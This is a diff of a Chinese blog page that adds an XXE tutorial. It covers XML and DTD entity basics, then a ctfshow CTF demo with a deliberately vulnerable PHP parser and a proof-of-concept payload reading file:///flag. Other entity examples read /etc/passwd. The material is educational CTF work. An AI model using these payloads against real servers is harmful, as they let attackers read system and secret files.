@@ -25,12 +25,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="xml的攻击手法?">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://baozongwi.xyz/images/QQ20240918-150130.png">
+<meta property="og:image" content="https://baozongwi.xyz/images/QQ20240918-151634.png">
 <meta property="article:published_time" content="2024-09-16T03:52:15.000Z">
-<meta property="article:modified_time" content="2024-09-16T13:44:25.131Z">
+<meta property="article:modified_time" content="2024-09-18T08:23:21.483Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="姿势">
 <meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baozongwi.xyz/images/QQ20240918-150130.png">
     
     
     <!--- Icon Part-->
@@ -456,8 +459,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-16 21:44:25</span>
-            <span class="mobile">2024-09-16 21:44:25</span>
+            <span class="desktop">2024-09-18 16:23:21</span>
+            <span class="mobile">2024-09-18 16:23:21</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -499,12 +502,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>49 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>8 Mins</span>
         </span>
     
     
@@ -524,7 +527,185 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>前两天看了一下<code>xxe</code>的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议</p>
-<h1 id="0x02-question"><a href="#0x02-question" class="headerlink" title="0x02 question"></a>0x02 question</h1><h2 id="xml了解"><a href="#xml了解" class="headerlink" title="xml了解"></a>xml了解</h2>
+<h1 id="0x02-question"><a href="#0x02-question" class="headerlink" title="0x02 question"></a>0x02 question</h1><h2 id="xml了解"><a href="#xml了解" class="headerlink" title="xml了解"></a>xml了解</h2><blockquote>
+<p>XML（<strong>Extensible Markup Language</strong>，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主要用于定义数据，而不是显示数据。XML 的设计目标是<strong>数据的可移植性</strong>、<strong>可读性</strong>以及<strong>易于扩展</strong>。也就是和序列化差不多的特点(但是不能混为一谈哦)</p>
+</blockquote>
+<p>XML 文档的结构通常由三部分组成：<strong>XML 声明</strong>、<strong>DTD(可选的文档类型定义)</strong> 和 **元素(内容部分)**。</p>
+<p>写一个<code>xml</code>的<code>demo</code>来分析这三个结构</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">bookstore</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;bookstore.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;fiction&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>The Great Gatsby<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span>F. Scott Fitzgerald<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1925<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;non-fiction&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Sapiens: A Brief History of Humankind<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span>Yuval Noah Harari<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>2011<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>14.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h3><p>这个东西就类似于，使用C语言编程的</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>所以也就是基本固定的，只不过有些选项是可选的</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>**<code>standalone=&quot;yes&quot;</code>**：表示这个 XML 文档是否依赖外部的 DTD 或其他外部实体。选项有：</p>
+<ul>
+<li><code>yes</code>：表示文档是自包含的，不依赖外部定义。</li>
+<li><code>no</code>：表示文档依赖外部 DTD 或实体。</li>
+</ul>
+<p>但是由于我们<code>xxe</code>是<strong>xml外部实体注入</strong>(<del>等会说</del>)，所以肯定是不写这个或者是写<code>no</code></p>
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>而这里又分为内部实体\外部实体\字符实体\参数实体，都是为了方便做参数替换来使用的，可以帮助简化和减少代码冗余。然后再使用<code>&amp;</code>进行调用(和C一样)</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span>  <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>一个很普通的DTD，这里主要就是想强调一个点</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [嵌套实体]&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里是要写根元素的，而不是想怎么写就怎么来(<del>实际上好像不这么写也能生效</del>)</p>
+<h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>比如说</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">example</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">author</span> <span class="string">&quot;Linjiang Zheng&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">example</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;author;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">example</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>那么此刻<code>author</code>表单的内容就是<code>Linjiang Zheng</code></p>
+<h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URL or path&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>还是写个<code>Demo</code></p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">llw</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span>  <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>就比如我们常见的，直接利用协议进行<code>flag</code>的读取</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/QQ20240918-150130.png"
+                      alt="1"
+                ></p>
+<p>这些协议都可以使用</p>
+<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="keyword">SYSTEM</span> <span class="string">&quot;URL or path&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>与外部实体略有不同</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %name;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>注意这种写法只可以在<code>dtd</code>文件中使用,也就是打无回显的<code>xxe</code></p>
+<h4 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h4><h5 id="预定义"><a href="#预定义" class="headerlink" title="预定义"></a>预定义</h5><p>这些是XML标准中已经定义好的一些常见字符，例如：</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span> 表示小于号 &lt;</span><br><span class="line"><span class="symbol">&amp;gt;</span> 表示大于号 &gt;</span><br><span class="line"><span class="symbol">&amp;amp;</span> 表示与号 &amp;</span><br><span class="line"><span class="symbol">&amp;quot;</span> 表示双引号 &quot;</span><br><span class="line"><span class="symbol">&amp;apos;</span> 表示单引号 &#x27;</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h5><ul>
+<li><strong>十进制数字实体</strong>：形式为 <code>&amp;#decimal;</code>，其中 <code>decimal</code> 是字符的十进制Unicode码点。</li>
+<li><strong>十六进制数字实体</strong>：形式为 <code>&amp;#xhex;</code> 或 <code>&amp;#Xhex;</code>，其中 <code>hex</code> 是字符的十六进制Unicode码点。</li>
+</ul>
+<p>比如说</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;#60;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;#x3C;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>都表示<code>&lt;</code></p>
+<table>
+<thead>
+<tr>
+<th>原字符</th>
+<th>预定义</th>
+<th>十六进制参考</th>
+<th>十进制参考</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&quot;</code></td>
+<td><code>&amp;quot;</code></td>
+<td><code>&amp;#x22;</code></td>
+<td><code>&amp;#34;</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td><code>&amp;amp;</code></td>
+<td><code>&amp;#x26;</code></td>
+<td><code>&amp;#38;</code></td>
+</tr>
+<tr>
+<td><code>&#39;</code></td>
+<td><code>&amp;apos;</code></td>
+<td><code>&amp;#x27;</code></td>
+<td><code>&amp;#39;</code></td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td><code>&amp;lt;</code></td>
+<td><code>&amp;#x3C;</code></td>
+<td><code>&amp;#60;</code></td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td><code>&amp;gt;</code></td>
+<td><code>&amp;#x3E;</code></td>
+<td><code>&amp;#62;</code></td>
+</tr>
+</tbody></table>
+<p>这张表格由于解析问题只能手做服了</p>
+<h4 id="PCDATA-CDATA"><a href="#PCDATA-CDATA" class="headerlink" title="PCDATA&amp;&amp;CDATA"></a>PCDATA&amp;&amp;CDATA</h4><p><strong>PCDATA</strong> 是 “Parsed Character Data” 的缩写，表示<strong>可解析的字符数据</strong>。也就是说，PCDATA 中的字符会被解析器解析，并根据 XML 或 HTML 的语法规则进行处理。</p>
+<p>在 PCDATA 中，某些字符（如 <code>&lt;</code>、<code>&amp;</code> 等）不能直接使用，必须进行转义或作为标签来使用。例如 <code>&lt;</code> 被解析为标签的开始，<code>&amp;</code> 被解析为实体引用的开始。</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">message</span>&gt;</span>Hello,<span class="symbol">&amp;#60;</span>world<span class="symbol">&amp;#62;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span>!<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>CDATA 是 “Character Data” 的缩写，表示<strong>不可解析的字符数据</strong>。也就是说，CDATA 部分的内容会被当作纯文本处理，不会进行解析。</p>
+<p>CDATA 区块中的所有字符，包括特殊字符（如 <code>&lt;</code>、<code>&gt;</code> 和 <code>&amp;</code>），都会被当作原始文本保留，而不是作为标签或实体解析。</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>&lt;![CDATA[Hello, &lt;b&gt;world&lt;/b&gt;!]]&gt;<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>PCDATA</th>
+<th>CDATA</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>解析</strong></td>
+<td>解析器会解析 PCDATA 的内容，并识别标签或实体引用。</td>
+<td>CDATA 中的内容不会被解析，全部作为文本处理。</td>
+</tr>
+<tr>
+<td><strong>使用特殊字符</strong></td>
+<td>必须对特殊字符（如 <code>&lt;</code> 和 <code>&amp;</code>）进行转义。</td>
+<td>特殊字符可以直接使用，不需要转义。</td>
+</tr>
+<tr>
+<td><strong>典型用途</strong></td>
+<td>适用于普通文本和可解析的标记内容。</td>
+<td>适用于代码片段或不希望被解析的文本内容。</td>
+</tr>
+<tr>
+<td><strong>定义形式</strong></td>
+<td>直接包含在元素内容中。</td>
+<td>使用 <code>&lt;![CDATA[...]]&gt;</code> 声明来包含数据。</td>
+</tr>
+<tr>
+<td><strong>嵌套标签</strong></td>
+<td>可以解析嵌套标签（如 <code>&lt;b&gt;</code>），并按标签的定义渲染。</td>
+<td>嵌套标签不会被解析成标记，而是作为文本内容显示。</td>
+</tr>
+</tbody></table>
+<h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>元素顺序是固定了的，所以在书写的时候也必须按着这个写，然后捏插入特殊符号也不能直接写</p>
+<p>xml的书写特性</p>
+<ul>
+<li>所有XMl元素必须有一个闭合标签</li>
+<li>XMl标签对大小写敏感</li>
+<li>XMl必须正确嵌套</li>
+<li>XML属性值必须加引号</li>
+<li>实体引用</li>
+<li>在XMl中，空格会被保留</li>
+</ul>
+<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><p>看了上面的东西其实也就会写个最简单的请求，不要晕了</p>
+<p>xxe是<strong>xml外部实体注入漏洞</strong>，那么既然是外部实体，所以其他的也就没有那么的重要，既然是注入那么这里有张图可以参考</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/QQ20240918-151634.png"
+                      alt="2"
+                ></p>
+<p>那么漏洞原理是什么呢</p>
+<blockquote>
+<p><strong>让服务端在解析XML文档时，对声明的外部实体进行引用，实际触发攻击者预定的文件、网络等资源操作，甚至是执行系统命令</strong></p>
+</blockquote>
+<p>这里的Demo就选择ctfshow <code>web</code>入门的<code>xxe</code>模块吧</p>
+<h3 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure></div>
+
+<p>可以进行外部实体加载，并且正常读取<code>xml</code>文档，读取<code>ctfshow</code>元素，根元素自己写</p>
+<p>写个<code>poc</code></p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">wi</span>&gt;</span><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span><span class="tag">&lt;/<span class="name">wi</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>直接打入即可，刚写的时候可能是容易写错的，我就写错了，所以建议找个在线<code>xml</code>辨别器</p>
+<h3 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h3><h2 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h2><p>直接禁用外部实体加载即可，或者是bypass这方面多点关键词</p>
+
         </div>
 
         
@@ -538,7 +719,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-16 21:44:25
+                    :</strong> 2024-09-18 16:23:21
             </li>
         
         <li>
@@ -666,7 +847,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">深入浅出xxe</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-question"><span class="nav-text">0x02 question</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xml%E4%BA%86%E8%A7%A3"><span class="nav-text">xml了解</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-question"><span class="nav-text">0x02 question</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xml%E4%BA%86%E8%A7%A3"><span class="nav-text">xml了解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xml%E5%A3%B0%E6%98%8E"><span class="nav-text">xml声明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD"><span class="nav-text">DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-text">内部实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="nav-text">外部实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-text">参数实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%AE%9E%E4%BD%93"><span class="nav-text">字符实体</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A2%84%E5%AE%9A%E4%B9%89"><span class="nav-text">预定义</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E5%AD%97"><span class="nav-text">数字</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PCDATA-CDATA"><span class="nav-text">PCDATA&amp;&amp;CDATA</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%83%E7%B4%A0"><span class="nav-text">元素</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xxe"><span class="nav-text">xxe</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Demo1"><span class="nav-text">Demo1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Demo2"><span class="nav-text">Demo2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fix"><span class="nav-text">fix</span></a></li></ol></li></ol>
 
     </div>
 </div>
@@ -703,7 +884,7 @@
                     </span>
                     
                         <span>
-                            119.7k words in total
+                            121.6k words in total
                         </span>
                     
                 </p>
